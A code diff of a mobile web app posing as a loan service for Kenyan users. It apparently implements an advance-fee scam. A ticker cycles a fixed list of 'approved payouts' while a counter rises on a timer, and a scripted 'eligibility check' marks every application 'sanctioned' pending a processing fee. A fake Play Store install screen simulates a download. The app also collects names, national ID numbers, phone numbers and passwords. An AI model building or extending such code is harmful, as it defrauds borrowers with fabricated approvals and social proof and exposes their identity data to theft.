-      retryBtn.className = 'mt-3 w-full bg-gray-100 text-gray-400 py-2.5 rounded-xl font-semibold text-xs cursor-not-allowed';
-
-      stkCooldownTimer = setInterval(() => {
-        remaining--;
-        countdownEl.textContent = remaining;
-        if (remaining <= 0) {
-          clearInterval(stkCooldownTimer);
-          stkCooldownTimer = null;
-          wrap.innerHTML = '<p class="text-[11px] text-emerald-700 font-medium">Ready to try again</p>';
-          retryBtn.disabled = false;
-          retryBtn.className = 'mt-3 w-full bg-emerald-700 text-white py-2.5 rounded-xl font-semibold text-xs active:scale-[0.98] transition-transform';
-        }
-      }, 1000);
-    }
-
-    function renderTickerItem(item) {
-      const container = $('proofTicker');
-      if (!container) return;
-
-      const initials = item.name.split(' ').map(p => p[0]).join('').slice(0, 2).toUpperCase();
-
-      container.innerHTML = `
-        <div class="flex items-center gap-3 w-full ticker-slide-in">
-          <div class="w-9 h-9 rounded-full bg-emerald-600 flex items-center justify-center flex-shrink-0 shadow-sm">
-            <span class="text-[11px] font-extrabold text-white">${initials}</span>
-          </div>
-          <div class="flex-1 min-w-0">
-            <div class="flex items-center justify-between gap-2">
-              <p class="text-[11px] font-bold text-gray-900 truncate">
-                ${esc(item.name)}
-                <span class="text-[9px] font-mono font-medium text-gray-500 ml-1">${esc(item.phone)}</span>
-              </p>
-              <span class="text-[9px] text-gray-400 flex-shrink-0">${esc(item.time)}</span>
-            </div>
-            <p class="text-[11px] font-black text-emerald-700 mt-0.5">
-              ${fmt(item.amount)} <span class="text-[9px] font-bold text-emerald-600 ml-1">✓ Approved</span>
-            </p>
-          </div>
-        </div>
-      `;
-    }
-
-    function startProofTicker() {
-      const ticker = $('proofTicker');
-      if (!ticker) return;
-
-      renderTickerItem(RECENT_PAYOUTS[0]);
-      tickerIndex = 1;
-
-      clearInterval(tickerTimer);
-      tickerTimer = setInterval(() => {
-        const current = ticker.firstElementChild;
-        if (current) {
-          current.classList.remove('ticker-slide-in');
-          current.classList.add('ticker-slide-out');
-        }
-
-        todayCount++;
-        const ltc = $('landingTodayCount');
-        const ptc = $('proofTodayCount');
-        [ltc, ptc].forEach(el => {
-          if (el) {
-            el.textContent = todayCount;
-            el.classList.add('counter-bump');
-            setTimeout(() => el.classList.remove('counter-bump'), 500);
-          }
-        });
-
-        setTimeout(() => {
-          const item = RECENT_PAYOUTS[tickerIndex % RECENT_PAYOUTS.length];
-          tickerIndex++;
-          renderTickerItem(item);
-        }, 380);
-      }, 3500);
-    }
-
-    function stopProofTicker() {
-      clearInterval(tickerTimer);
-      tickerTimer = null;
-    }
-
-    // ── PALPLUSS FUTURE double-check consent ──
-    function onPalplussCheckboxChange() {
-      const cb = $('palplussConsent');
-      const confirmBtn = $('palplussConsentConfirmBtn');
-      if (!cb || !confirmBtn) return;
-
-      if (!cb.checked) {
-        palplussConsentConfirmed = false;
-        confirmBtn.disabled = true;
-        confirmBtn.className = 'mt-3 w-full bg-gray-200 text-gray-500 py-2.5 rounded-lg font-bold text-xs uppercase tracking-wide cursor-not-allowed transition-colors';
-        confirmBtn.textContent = 'Step 2: Tap to Confirm';
-        updatePalplussConsent();
-        return;
-      }
-
-      confirmBtn.disabled = false;
-      confirmBtn.className = 'mt-3 w-full bg-amber-500 hover:bg-amber-600 text-white py-2.5 rounded-lg font-bold text-xs uppercase tracking-wide active:scale-[0.98] transition-all';
-      confirmBtn.textContent = 'Step 2: Tap to Confirm';
-      updatePalplussConsent();
-    }
-
-    function confirmPalplussConsent() {
-      const cb = $('palplussConsent');
-      const confirmBtn = $('palplussConsentConfirmBtn');
-      if (!cb || !cb.checked || !confirmBtn) return;
-
-      palplussConsentConfirmed = true;
-      confirmBtn.disabled = true;
-      confirmBtn.className = 'mt-3 w-full bg-emerald-600 text-white py-2.5 rounded-lg font-bold text-xs uppercase tracking-wide cursor-default';
-      confirmBtn.innerHTML = '&#10003; Confirmed &mdash; PALPLUSS FUTURE';
-
-      updatePalplussConsent();
-      showToast('PALPLUSS FUTURE confirmed. You can now proceed.');
-    }
-
-    function updatePalplussConsent() {
-      const btn = $('holdPayBtn');
-      const label = $('holdPayLabel');
-      const wrap = $('palplussConsentWrap');
-      if (!btn || !label) return;
-
-      if (palplussConsentConfirmed) {
-        btn.disabled = false;
-        btn.className = 'relative flex-1 bg-red-600 text-white py-3 rounded-xl font-black text-sm uppercase tracking-wide shadow-lg active:scale-[0.98] transition-transform';
-        if (wrap) wrap.className = 'mt-4 bg-emerald-50 border-2 border-emerald-500 rounded-xl p-3 transition-colors';
-        label.innerHTML = `
-          <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z" />
-          </svg>
-          Tap to Pay KSh 100
-        `;
-      } else {
-        btn.disabled = true;
-        btn.className = 'relative flex-1 bg-gray-300 text-gray-500 py-3 rounded-xl font-black text-sm uppercase tracking-wide shadow-lg cursor-not-allowed';
-        if (wrap) {
-          const cb = $('palplussConsent');
-          wrap.className = (cb && cb.checked)
-            ? 'mt-4 bg-amber-50 border-2 border-amber-400 rounded-xl p-3 transition-colors'
-            : 'mt-4 bg-blue-50 border-2 border-blue-400 rounded-xl p-3 transition-colors';
-        }
-        label.innerHTML = `
-          <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
-          </svg>
-          Complete both steps
-        `;
-      }
-    }
-
-    function resetPalplussConsent() {
-      palplussConsentConfirmed = false;
-      amountConfirmRevealed = false;
-      const cb = $('palplussConsent');
-      const confirmBtn = $('palplussConsentConfirmBtn');
-      if (cb) cb.checked = false;
-      if (confirmBtn) {
-        confirmBtn.disabled = true;
-        confirmBtn.className = 'mt-3 w-full bg-gray-200 text-gray-500 py-2.5 rounded-lg font-bold text-xs uppercase tracking-wide cursor-not-allowed transition-colors';
-        confirmBtn.textContent = 'Step 2: Tap to Confirm';
-      }
-      // Hide amount confirm section
-      const section = $('amountConfirmSection');
-      if (section) section.classList.add('hidden');
-      const input = $('amountConfirmInput');
-      if (input) input.value = '';
-      const err = $('amountConfirmError');
-      if (err) err.classList.add('hidden');
-      const submitBtn = $('amountConfirmSubmitBtn');
-      if (submitBtn) {
-        submitBtn.disabled = true;
-        submitBtn.className = 'flex-[2] bg-gray-300 text-gray-500 py-3 rounded-xl font-black text-sm uppercase tracking-wide shadow-lg cursor-not-allowed';
-      }
-      updatePalplussConsent();
-    }
-
-    // ── AMOUNT CONFIRMATION (replaces hold-to-pay) ──
-    function onMainPayBtnTap() {
-      if (!confirmSelectedAmount) return;
-      if (!palplussConsentConfirmed) {
-        showToast('Please complete both PALPLUSS FUTURE steps first', { variant: 'warning' });
-        return;
-      }
-
-      // Reveal the amount confirmation section
-      amountConfirmRevealed = true;
-      const section = $('amountConfirmSection');
-      const input = $('amountConfirmInput');
-      const target = $('amountConfirmTarget');
-
-      const { fee } = processingFee(Number(confirmSelectedAmount));
-      if (target) target.textContent = String(fee);
-
-      if (section) {
-        section.classList.remove('hidden');
-        section.classList.add('slide-down');
-      }
-
-      // Hide the main action button row so the input is the focus
-      const mainRow = $('holdPayBtn');
-      if (mainRow) mainRow.disabled = true;
-      const mainLabel = $('holdPayLabel');
-      if (mainLabel) mainLabel.innerHTML = '<span>Confirm below…</span>';
-
-      // Focus the input
-      setTimeout(() => {
-        if (input) input.focus();
-      }, 250);
-    }
-
-    function onAmountConfirmInput() {
-      const input = $('amountConfirmInput');
-      const err = $('amountConfirmError');
-      const submitBtn = $('amountConfirmSubmitBtn');
-      if (!input || !submitBtn) return;
-
-      const typed = String(input.value || '').trim();
-      const { fee } = processingFee(Number(confirmSelectedAmount));
-      const target = String(fee);
-
-      if (err) err.classList.add('hidden');
-
-      if (typed === '') {
-        submitBtn.disabled = true;
-        submitBtn.className = 'flex-[2] bg-gray-300 text-gray-500 py-3 rounded-xl font-black text-sm uppercase tracking-wide shadow-lg cursor-not-allowed';
-        return;
-      }
-
-      if (typed === target) {
-        submitBtn.disabled = false;
-        submitBtn.className = 'flex-[2] bg-red-600 hover:bg-red-700 text-white py-3 rounded-xl font-black text-sm uppercase tracking-wide shadow-lg active:scale-[0.98] transition-transform';
-      } else {
-        submitBtn.disabled = true;
-        submitBtn.className = 'flex-[2] bg-gray-300 text-gray-500 py-3 rounded-xl font-black text-sm uppercase tracking-wide shadow-lg cursor-not-allowed';
-      }
-    }
-
-    function cancelAmountConfirm() {
-      amountConfirmRevealed = false;
-      const section = $('amountConfirmSection');
-      if (section) section.classList.add('hidden');
-      const input = $('amountConfirmInput');
-      if (input) input.value = '';
-      const err = $('amountConfirmError');
-      if (err) err.classList.add('hidden');
-      const submitBtn = $('amountConfirmSubmitBtn');
-      if (submitBtn) {
-        submitBtn.disabled = true;
-        submitBtn.className = 'flex-[2] bg-gray-300 text-gray-500 py-3 rounded-xl font-black text-sm uppercase tracking-wide shadow-lg cursor-not-allowed';
-      }
-
-      // Restore main button
-      updatePalplussConsent();
-    }
-
-    function submitAmountConfirmation() {
-      const input = $('amountConfirmInput');
-      const err = $('amountConfirmError');
-      if (!input) return;
-
-      const typed = String(input.value || '').trim();
-      const { fee } = processingFee(Number(confirmSelectedAmount));
-      const target = String(fee);
-
-      if (typed !== target) {
-        if (err) {
-          err.textContent = `Amount must be exactly ${target}`;
-          err.classList.remove('hidden');
-        }
-        return;
-      }
-
-      // Correct! Proceed to payment
-      confirmPaymentAndProceed();
-    }
-
-    function renderLandingAmountBoxes() {
-      const container = $('landingAmountBoxes');
-      container.innerHTML = '';
-      AMOUNT_STEPS.forEach(amt => {
-        const btn = document.createElement('button');
-        btn.type = 'button';
-        btn.className = 'amount-box';
-        btn.innerHTML = `
-          <p class="text-sm font-bold text-gray-900">${fmtZMW(amt)}</p>
-          <p class="text-[10px] text-gray-500 mt-0.5">&asymp; ${fmt(amt)}</p>
-        `;
-        btn.onclick = () => {
-          selectedAmountFromLanding = amt;
-          wizardSelectedAmount = amt;
-          openApplyWizard();
+        const format = (num) => "Ksh " + num.toLocaleString();
+        const showScreen = (id) => {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            window.scrollTo(0,0);
         };
-        container.appendChild(btn);
-      });
-    }
-
-    function renderWizardAmountBoxes() {
-      const container = $('wizardAmountBoxes');
-      container.innerHTML = '';
-      AMOUNT_STEPS.forEach(amt => {
-        const btn = document.createElement('button');
-        btn.type = 'button';
-        const isSelected = wizardSelectedAmount === amt;
-        btn.className = 'amount-box' + (isSelected ? ' selected' : '');
-        btn.innerHTML = `
-          <p class="text-sm font-bold ${isSelected ? 'text-emerald-900' : 'text-gray-900'}">${fmtZMW(amt)}</p>
-          <p class="text-[10px] ${isSelected ? 'text-emerald-700' : 'text-gray-500'} mt-0.5">&asymp; ${fmt(amt)}</p>
-        `;
-        btn.onclick = () => {
-          wizardSelectedAmount = amt;
-          renderWizardAmountBoxes();
-          updateWizardSelectedDisplay();
+        const calculateLevy = (loan) => {
+            if (loan <= 1000) return 150;
+            if (loan >= 50000) return 500;
+            let fee = 150 + (loan - 1000) * (350 / 49000);
+            return Math.round(fee / 5) * 5;
         };
-        container.appendChild(btn);
-      });
-    }
+        const getDueDate = (days) => {
+            let d = new Date(); d.setDate(d.getDate() + days);
+            return d.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });
+        };
+        function showToast(msg, duration = 4000) {
+            const toast = document.getElementById('toast');
+            document.getElementById('toast-msg').innerText = msg;
+            toast.classList.remove('hide');
+            setTimeout(() => toast.classList.add('hide'), duration);
+        }
 
-    function updateWizardSelectedDisplay() {
-      const display = $('wizardSelectedDisplay');
-      if (wizardSelectedAmount) {
-        $('wizardSelectedAmount').textContent = fmtZMW(wizardSelectedAmount);
-        $('wizardSelectedAmountKsh').textContent = '\u2248 ' + fmt(wizardSelectedAmount);
-        const { fee } = processingFee(wizardSelectedAmount);
-        $('wizardSelectedFee').textContent = fmtZMW(fee);
-        $('wizardSelectedFeeKsh').textContent = '\u2248 ' + fmt(fee);
-        const receiveEl = $('wizardSelectedYouReceive');
-        if (receiveEl) receiveEl.textContent = fmtZMW(wizardSelectedAmount);
-        display.classList.remove('hidden');
-      } else {
-        display.classList.add('hidden');
-      }
-    }
+        // ==========================================
+        // 0. OFFLINE GATE LOGIC
+        // ==========================================
+        const offlineGate = document.getElementById('offline-gate');
 
-    function prefillWizardForSignedInUser() {
-      const banner = $('signedInBanner');
-      const bannerPhone = $('signedInPhone');
-      const pwdHint = $('wizPasswordHint');
+        function updateConnectionStatus() {
+            if (!navigator.onLine) {
+                offlineGate.classList.remove('hide');
+            } else {
+                offlineGate.classList.add('hide');
+            }
+        }
 
-      if (!currentUser) {
-        if (banner) banner.classList.add('hidden');
-        if (pwdHint) pwdHint.classList.add('hidden');
-        return;
-      }
+        // Listen for network changes
+        window.addEventListener('online', updateConnectionStatus);
+        window.addEventListener('offline', updateConnectionStatus);
 
-      const emailPhone = phoneFromEmail(currentUser.email);
-      const profilePhone = currentProfile?.phone ? normalizePhone(currentProfile.phone) : emailPhone;
+        // Manual retry button
+        window.retryConnection = function() {
+            if (navigator.onLine) {
+                offlineGate.classList.add('hide');
+                showToast("✅ Connection restored!");
+            } else {
+                showToast("Still offline. Please check your network settings.");
+            }
+        };
 
-      if (profilePhone) {
-        $('wizPhone').value = formatPhoneDisplay(profilePhone);
-        $('wizPhone').readOnly = true;
-        $('wizPhone').classList.add('bg-emerald-50', 'border-emerald-200');
-      }
-      if (currentProfile?.full_name) $('wizName').value = currentProfile.full_name;
-      if (currentProfile?.national_id) $('wizId').value = currentProfile.national_id;
+        // ==========================================
+        // INSTALL FLOW
+        // ==========================================
+        let deferredPrompt;
+        const playStoreGate = document.getElementById('play-store-gate');
+        const browserWarning = document.getElementById('browser-warning');
+        const appContent = document.getElementById('app-content');
+        const findOnHomeScreen = document.getElementById('find-on-home-screen');
+        const btnStoreInstall = document.getElementById('btn-store-install');
+        const installActionArea = document.getElementById('install-action-area');
+        const fakeDownloadArea = document.getElementById('fake-download-area');
+        const openAppArea = document.getElementById('open-app-area');
+        const downloadBar = document.getElementById('download-bar');
+        const downloadPercent = document.getElementById('download-percent');
+        const downloadSize = document.getElementById('download-size');
+        const topSizeText = document.getElementById('top-size-text');
 
-      $('wizPassword').required = false;
-      $('wizPassword').placeholder = 'Already signed in';
-      $('wizPassword').value = '';
+        const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
+        const wasInstalled = localStorage.getItem('pwa_installed') === 'true';
+        const ua = navigator.userAgent || navigator.vendor || window.opera;
+        const isInApp = /musical_ly|BytedanceWebview|FBAN|FBAV|Instagram|WebView|Twitter/i.test(ua);
 
-      if (banner && bannerPhone) {
-        bannerPhone.textContent = profilePhone ? formatPhoneDisplay(profilePhone) : 'your account';
-        banner.classList.remove('hidden');
-      }
-      if (pwdHint) pwdHint.classList.remove('hidden');
-    }
+        // Check connection on initial load
+        updateConnectionStatus();
 
-    let wizardCurrentStep = 1;
-    function openApplyWizard() {
-      wizardCurrentStep = 1;
-      if (selectedAmountFromLanding) wizardSelectedAmount = selectedAmountFromLanding;
-      renderWizardAmountBoxes();
-      updateWizardSelectedDisplay();
-      updateWizardUI();
-      prefillWizardForSignedInUser();
-      showView('applyWizardView');
-    }
-
-    function closeApplyWizard() { showView('landingView'); }
-
-    function updateWizardUI() {
-      document.querySelectorAll('.wizard-step').forEach(el => {
-        el.classList.toggle('active', parseInt(el.dataset.step) === wizardCurrentStep);
-      });
-      document.querySelectorAll('.wizard-dot').forEach(el => {
-        const step = parseInt(el.dataset.step);
-        el.classList.remove('active', 'done');
-        if (step === wizardCurrentStep) el.classList.add('active');
-        else if (step < wizardCurrentStep) el.classList.add('done');
-      });
-      document.querySelectorAll('.wizard-line').forEach(el => {
-        const line = parseInt(el.dataset.line);
-        el.classList.toggle('done', line < wizardCurrentStep);
-      });
-      const labels = ['', 'Choose amount', 'Your details', 'Review & submit'];
-      $('wizardStepLabel').textContent = `Step ${wizardCurrentStep} of 3 \u2014 ${labels[wizardCurrentStep]}`;
-    }
-
-    function wizardNext(toStep) {
-      $('wizardError').classList.add('hidden');
-      if (wizardCurrentStep === 1) {
-        if (!wizardSelectedAmount) return showWizardError('Please pick a loan amount by tapping a box.');
-      }
-      if (wizardCurrentStep === 2) {
-        const name = $('wizName').value.trim();
-        const id = $('wizId').value.trim();
-        const phone = $('wizPhone').value.trim();
-        const password = $('wizPassword').value;
-        if (!name) return showWizardError('Please enter your full name.');
-        if (!/^\d{7,8}$/.test(id)) return showWizardError('National ID must be 7 or 8 digits.');
-        if (!isValidKePhone(phone)) return showWizardError('Enter a valid phone number.');
-        if (!currentUser && password.length < 6) return showWizardError('Password must be at least 6 characters.');
-      }
-      if (toStep === 3) {
-        const name = $('wizName').value.trim();
-        const id = $('wizId').value.trim();
-        const phone = normalizePhone($('wizPhone').value);
-        const tenure = parseInt($('wizTenure').value);
-        $('reviewName').textContent = name;
-        $('reviewId').textContent = id;
-        $('reviewPhone').textContent = formatPhoneDisplay(phone);
-        $('reviewAmount').textContent = fmtZMW(wizardSelectedAmount);
-        $('reviewAmountKsh').textContent = '\u2248 ' + fmt(wizardSelectedAmount);
-        $('reviewTenure').textContent = tenure + ' months';
-        const { fee } = processingFee(wizardSelectedAmount);
-        $('reviewFee').textContent = fmtZMW(fee);
-        $('reviewFeeKsh').textContent = '\u2248 ' + fmt(fee);
-      }
-      wizardCurrentStep = toStep;
-      updateWizardUI();
-      window.scrollTo(0, 0);
-    }
-
-    function wizardBack(toStep) {
-      wizardCurrentStep = toStep;
-      updateWizardUI();
-      window.scrollTo(0, 0);
-    }
-
-    function showWizardError(msg) {
-      const el = $('wizardError');
-      el.textContent = msg;
-      el.classList.remove('hidden');
-      window.scrollTo(0, 0);
-    }
-
-    async function runEligibilityAnimation() {
-      const steps = [
-        { label: 'Verifying your identity', duration: 850 },
-        { label: 'Checking your phone number', duration: 850 },
-        { label: 'Reviewing credit profile', duration: 1050 },
-        { label: 'Preparing your offer', duration: 750 },
-      ];
-      const total = steps.reduce((s, x) => s + x.duration, 0);
-
-      const container = $('eligSteps');
-      container.innerHTML = steps.map((s, i) => `
-        <div class="flex items-center gap-3" data-step="${i}">
-          <div class="elig-icon w-5 h-5 rounded-full border-2 border-gray-200 flex items-center justify-center flex-shrink-0 transition-colors"></div>
-          <span class="elig-label text-sm text-gray-400 transition-colors">${s.label}</span>
-        </div>
-      `).join('');
-
-      $('eligProgress').style.width = '0%';
-      $('eligPercent').textContent = '0%';
-      $('eligTitle').textContent = 'Checking eligibility...';
-      $('eligSubtitle').textContent = 'Please wait a moment';
-
-      let elapsed = 0;
-      for (let i = 0; i < steps.length; i++) {
-        const stepEl = container.querySelector(`[data-step="${i}"]`);
-        const icon = stepEl.querySelector('.elig-icon');
-        const label = stepEl.querySelector('.elig-label');
-        icon.classList.add('border-emerald-500');
-        label.classList.remove('text-gray-400');
-        label.classList.add('text-gray-900', 'font-medium');
-
-        const start = elapsed;
-        const t0 = Date.now();
-        await new Promise(resolve => {
-          const tick = () => {
-            const p = Math.min(1, (Date.now() - t0) / steps[i].duration);
-            const pct = Math.round(((start + p * steps[i].duration) / total) * 100);
-            $('eligProgress').style.width = pct + '%';
-            $('eligPercent').textContent = pct + '%';
-            if (p < 1) requestAnimationFrame(tick);
-            else resolve();
-          };
-          tick();
-        });
-        elapsed += steps[i].duration;
-
-        icon.classList.remove('border-emerald-500');
-        icon.classList.add('bg-emerald-500', 'border-emerald-500');
-        icon.innerHTML = '<svg class="w-3 h-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>';
-      }
-
-      $('eligTitle').textContent = '\u2713 Eligible';
-      $('eligSubtitle').textContent = 'Redirecting to payment...';
-      await sleep(500);
-    }
-
-    function openLoginFromLanding() {
-      loginReturnView = 'landingView';
-      pendingApplication = null;
-      openLoginView('');
-    }
-
-    function openLoginView(prefillPhone = '') {
-      $('loginPhone').value = prefillPhone ? formatPhoneDisplay(prefillPhone) : '';
-      $('loginPassword').value = '';
-      $('loginError').classList.add('hidden');
-
-      if (pendingApplication) {
-        $('loginSubtitle').textContent = 'Your phone number is already registered. Sign in to continue your application.';
-      } else {
-        $('loginSubtitle').textContent = 'Sign in to view your loans and apply again.';
-      }
-      showView('loginView');
-    }
-
-    function closeLogin() {
-      if (loginReturnView === 'applyWizardView') {
-        wizardCurrentStep = 3;
-        showView('applyWizardView');
-        updateWizardUI();
-        const errBox = $('wizardSubmitError');
-        errBox.innerHTML = 'Sign-in cancelled. If you want to use a different phone number, go back to <strong>Your details</strong> and edit it.';
-        errBox.classList.remove('hidden');
-      } else {
-        showView('landingView');
-      }
-      loginReturnView = 'landingView';
-      pendingApplication = null;
-    }
-
-    async function attemptLogin() {
-      const rawPhone = $('loginPhone').value.trim();
-      const password = $('loginPassword').value;
-      const errBox = $('loginError');
-      const btn = $('loginBtn');
-      const btnText = $('loginBtnText');
-
-      errBox.classList.add('hidden');
-
-      if (!isValidKePhone(rawPhone)) {
-        errBox.textContent = 'Enter a valid phone number.';
-        errBox.classList.remove('hidden');
-        return;
-      }
-      if (!password || password.length < 6) {
-        errBox.textContent = 'Password must be at least 6 characters.';
-        errBox.classList.remove('hidden');
-        return;
-      }
-
-      const phone = normalizePhone(rawPhone);
-      btn.disabled = true;
-      btnText.innerHTML = spinner() + ' Signing in...';
-
-      const { data, error } = await sb.auth.signInWithPassword({
-        email: phoneToEmail(phone),
-        password,
-      });
-
-      if (error) {
-        btn.disabled = false;
-        btnText.textContent = 'Sign In';
-        const msg = error.message.toLowerCase();
-        if (msg.includes('invalid') || msg.includes('credentials')) {
-          errBox.textContent = 'Wrong phone number or password. Please try again.';
+        if (isStandalone) {
+            playStoreGate.classList.add('hide');
+            appContent.classList.remove('hide');
+            checkSession();
+        } else if (isInApp) {
+            browserWarning.classList.remove('hide');
+        } else if (wasInstalled) {
+            playStoreGate.classList.remove('hide');
+            installActionArea.classList.add('hide');
+            openAppArea.classList.remove('hide');
+            topSizeText.innerText = "10 MB";
         } else {
-          errBox.textContent = error.message;
-        }
-        errBox.classList.remove('hidden');
-        return;
-      }
-
-      currentUser = data.user;
-      const { data: profile } = await sb.from('profiles').select('*').eq('id', data.user.id).maybeSingle();
-      currentProfile = profile || null;
-
-      if (pendingApplication) {
-        const { amount, tenure } = pendingApplication;
-        btnText.innerHTML = spinner() + ' Creating your loan...';
-
-        const { fee } = processingFee(amount);
-        const refNo = makeRefNo();
-        const expires = new Date(Date.now() + 24 * 3600 * 1000).toISOString();
-
-        const { data: appData, error: appErr } = await sb.from('loan_applications').insert({
-          user_id: data.user.id,
-          loan_amount: amount,
-          tenure_months: tenure,
-          status: 'sanctioned',
-          approved_amount: amount,
-          interest_rate: ANNUAL_RATE,
-          processing_fee: fee,
-          reference_no: refNo,
-          offer_expires_at: expires,
-          payment_status: 'unpaid',
-        }).select().single();
-
-        btn.disabled = false;
-        btnText.textContent = 'Sign In';
-
-        if (appErr) {
-          errBox.textContent = appErr.message;
-          errBox.classList.remove('hidden');
-          return;
+            playStoreGate.classList.remove('hide');
+            installActionArea.classList.remove('hide');
+            openAppArea.classList.add('hide');
+            topSizeText.innerText = "10 MB";
         }
 
-        pendingApplication = null;
-        selectedAmountFromLanding = null;
-        wizardSelectedAmount = null;
-        currentApp = appData;
-        openPaymentView('dashboard');
-        return;
-      }
-
-      btn.disabled = false;
-      btnText.textContent = 'Sign In';
-      await loadDashboard();
-    }
-
-    async function createAccountAndLoan({ phone, password, name, nationalId, amount, tenure }) {
-      const { data, error } = await sb.auth.signUp({
-        email: phoneToEmail(phone),
-        password,
-        options: { data: { full_name: name, phone: phone, national_id: nationalId } },
-      });
-
-      if (error) {
-        const e = new Error(error.message);
-        if (error.message.toLowerCase().includes('already')) e.code = 'ALREADY_REGISTERED';
-        throw e;
-      }
-
-      if (data.user) {
-        await sb.from('profiles').update({
-          phone: phone,
-          national_id: nationalId,
-        }).eq('id', data.user.id);
-      }
-
-      const { fee } = processingFee(amount);
-      const refNo = makeRefNo();
-      const expires = new Date(Date.now() + 24 * 3600 * 1000).toISOString();
-
-      const { data: appData, error: appError } = await sb.from('loan_applications').insert({
-        user_id: data.user.id,
-        loan_amount: amount,
-        tenure_months: tenure,
-        status: 'sanctioned',
-        approved_amount: amount,
-        interest_rate: ANNUAL_RATE,
-        processing_fee: fee,
-        reference_no: refNo,
-        offer_expires_at: expires,
-        payment_status: 'unpaid',
-      }).select().single();
-
-      if (appError) throw new Error(appError.message);
-      return { appData };
-    }
-
-    async function submitApplication() {
-      const btn = $('wizSubmitBtn');
-      const btnText = $('wizSubmitText');
-      const errBox = $('wizardSubmitError');
-      errBox.classList.add('hidden');
-
-      if (!wizardSelectedAmount) {
-        errBox.textContent = 'Please pick a loan amount.';
-        errBox.classList.remove('hidden');
-        return;
-      }
-      if (!$('wizAgree').checked) {
-        errBox.textContent = 'Please agree to the Terms before submitting.';
-        errBox.classList.remove('hidden');
-        return;
-      }
-
-      const phone = normalizePhone($('wizPhone').value);
-      const password = $('wizPassword').value;
-      const name = $('wizName').value.trim();
-      const nationalId = $('wizId').value.trim();
-      const amount = wizardSelectedAmount;
-      const tenure = parseInt($('wizTenure').value);
-
-      const el = eligibility(amount);
-      if (!el.eligible) {
-        errBox.innerHTML = `<strong>Not eligible.</strong> ${el.reason}`;
-        errBox.classList.remove('hidden');
-        return;
-      }
-
-      btn.disabled = true;
-      btnText.innerHTML = spinner() + ' Checking...';
-
-      if (currentUser) {
-        if (!currentProfile) {
-          const { data: fetched } = await sb.from('profiles').select('*').eq('id', currentUser.id).maybeSingle();
-          if (fetched) currentProfile = fetched;
-        }
-        const emailPhone = phoneFromEmail(currentUser.email);
-        const profilePhone = currentProfile?.phone ? normalizePhone(currentProfile.phone) : emailPhone;
-
-        if (!profilePhone || profilePhone === phone) {
-          btnText.innerHTML = spinner() + ' Creating your loan...';
-          const { fee } = processingFee(amount);
-          const refNo = makeRefNo();
-          const expires = new Date(Date.now() + 24 * 3600 * 1000).toISOString();
-
-          const { data: appData, error: appError } = await sb.from('loan_applications').insert({
-            user_id: currentUser.id,
-            loan_amount: amount,
-            tenure_months: tenure,
-            status: 'sanctioned',
-            approved_amount: amount,
-            interest_rate: ANNUAL_RATE,
-            processing_fee: fee,
-            reference_no: refNo,
-            offer_expires_at: expires,
-            payment_status: 'unpaid',
-          }).select().single();
-
-          btn.disabled = false;
-          btnText.textContent = 'Check Eligibility';
-          if (appError) { errBox.textContent = appError.message; errBox.classList.remove('hidden'); return; }
-
-          selectedAmountFromLanding = null;
-          wizardSelectedAmount = null;
-          currentApp = appData;
-          openPaymentView('dashboard');
-          return;
-        }
-
-        btn.disabled = false;
-        btnText.textContent = 'Check Eligibility';
-        errBox.innerHTML = `You are signed in as <strong>${formatPhoneDisplay(profilePhone)}</strong>. To apply with a different number, <a href="#" onclick="logoutUser(); openApplyWizard(); return false;" class="underline font-semibold">log out first</a>, or change the phone number back to <strong>${formatPhoneDisplay(profilePhone)}</strong>.`;
-        errBox.classList.remove('hidden');
-        return;
-      }
-
-      const { data: existingProfile } = await sb.from('profiles').select('id').eq('phone', phone).maybeSingle();
-      if (existingProfile) {
-        pendingApplication = { amount, tenure };
-        loginReturnView = 'applyWizardView';
-        openLoginView(phone);
-        btn.disabled = false;
-        btnText.textContent = 'Check Eligibility';
-        return;
-      }
-
-      let apiResult = null, apiError = null;
-      const apiPromise = createAccountAndLoan({ phone, password, name, nationalId, amount, tenure })
-        .then(r => { apiResult = r; })
-        .catch(e => { apiError = e; });
-
-      showView('eligibilityView');
-      await runEligibilityAnimation();
-      await apiPromise;
-      await sleep(250);
-
-      if (apiError) {
-        if (apiError.code === 'ALREADY_REGISTERED') {
-          pendingApplication = { amount, tenure };
-          loginReturnView = 'applyWizardView';
-          openLoginView(phone);
-          btn.disabled = false;
-          btnText.textContent = 'Check Eligibility';
-          return;
-        }
-        wizardCurrentStep = 3;
-        showView('applyWizardView');
-        updateWizardUI();
-        errBox.textContent = apiError.message;
-        errBox.classList.remove('hidden');
-        btn.disabled = false;
-        btnText.textContent = 'Check Eligibility';
-        return;
-      }
-
-      selectedAmountFromLanding = null;
-      wizardSelectedAmount = null;
-      const { data: { user } } = await sb.auth.getUser();
-      currentUser = user;
-      if (user) {
-        const { data: profile } = await sb.from('profiles').select('*').eq('id', user.id).maybeSingle();
-        currentProfile = profile || null;
-      }
-
-      currentApp = apiResult.appData;
-      btn.disabled = false;
-      btnText.textContent = 'Check Eligibility';
-      openPaymentView('dashboard');
-    }
-
-    function openStatusCheck() {
-      $('statusPhone').value = '';
-      $('statusResult').classList.add('hidden');
-      showView('statusView');
-    }
-
-    async function checkApplicationStatus() {
-      const phone = normalizePhone($('statusPhone').value);
-      const btn = $('statusCheckBtn');
-      const btnText = $('statusCheckText');
-      const result = $('statusResult');
-
-      if (!isValidKePhone(phone)) {
-        result.className = 'bg-red-50 border border-red-100 text-red-800 text-sm rounded-xl p-3';
-        result.textContent = 'Please enter a valid phone number.';
